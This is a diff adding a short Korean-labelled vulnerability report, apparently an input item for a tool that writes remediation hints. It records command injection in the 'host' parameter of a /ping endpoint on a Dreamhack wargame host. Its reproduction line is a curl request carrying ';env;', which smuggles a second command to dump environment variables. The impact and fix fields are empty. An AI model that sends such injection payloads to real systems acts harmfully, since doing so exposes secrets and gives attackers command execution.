@@ -1,0 +1,11 @@
+입력:
+제목: Command execution
+심각도: MEDIUM
+카테고리: Command execution
+엔드포인트: /ping
+CVE: N/A
+설명: Command execution via injection in the parameter host
+영향: 
+증거: host
+재현: curl "http://host8.dreamhack.games:23482/ping" -e "http://host8.dreamhack.games:23482/ping" -d "host=%3Benv%3B"
+대응/조치 힌트:
